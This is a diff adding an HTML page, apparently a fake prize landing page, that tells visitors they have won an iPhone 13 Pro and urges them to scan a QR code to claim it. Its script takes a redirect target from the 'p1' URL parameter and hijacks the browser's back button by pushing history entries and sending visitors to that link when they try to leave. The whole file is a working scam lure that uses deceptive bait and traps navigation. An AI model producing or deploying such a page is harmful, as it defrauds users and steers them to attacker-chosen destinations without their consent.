@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet icon" href="img/icon2.png" />
+    <title>Apple iPhone 13 Pro</title>
+    <meta content="Congratulations! You have won the iPhone 13 Pro! Just scan this QR code with your mobile phone's camera to claim your prize!" name="description">
+    <script src="jquery.min.js" charset="utf-8"></script>
+    <link rel="stylesheet" href="css/animate.css">
+    <link media="all" rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+
+<body>
+
+    <header>
+        <div class="container">
+            <img class="logo" src="img/icon.png">
+            iPhone 13 Pro
+        </div>
+    </header>
+
+    <div class="main container">
+        <div class="top">
+            <h1>Congratulations!</h1>
+            <p class="anim2">You have won the iPhone 13 Pro!</p>
+        </div>
+        <div class="info">
+            <img src="img/item1.png">
+            <div class="description">
+                <p>One Final Step:</p>
+                <img src="img/qr.png">
+                <p>To claim your prize please scan this QR<br> code with your mobile phone's camera.<br><br>
+                You will get a link to your new iPhone!</p>
+            </div>
+        </div>
+    </div>
+
+<script>
+
+let animation1=document.querySelector('h1');
+let animation2=document.querySelector('.anim2')
+let animation3=document.querySelector('header');
+let animation4=document.querySelector('.info');
+    
+ function animate2() {
+    animation2.style.visibility = 'visible';
+    animation2.classList.add('fadeIn1');
+}
+function animate3() {
+    animation3.style.visibility = 'visible';
+    animation3.classList.add('fadeIn1');
+}
+function animate4() {
+    animation4.style.visibility = 'visible';
+    animation4.classList.add('fadeInDown');
+}
+
+
+setTimeout(() => animation1.classList.add('fadeIn1'), 0);
+setTimeout(() => animate2(), 1000);
+setTimeout(() => animate3(), 2000);
+setTimeout(() => animate4(), 2000);
+    
+</script>
+
+
+
+
+
+  <script type="text/javascript">
+
+    var fin_link = decodeURIComponent(getURLParameter('p1'));
+    var links = document.getElementsByClassName('finlink');
+    for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+    for (var j = 0; j < links.length; j++) {
+      links[j].addEventListener('click', function () {
+        window.onbeforeunload = null;
+      });
+    }
+
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+
+    //Historyback
+    ! function() {
+        var t;
+        try {
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+            onpopstate = function(t) {
+                window.onbeforeunload = null;
+                t.state && location.replace(fin_link);
+            };
+        } catch (o) {}
+    }();
+  </script>
+</body>
+</html>
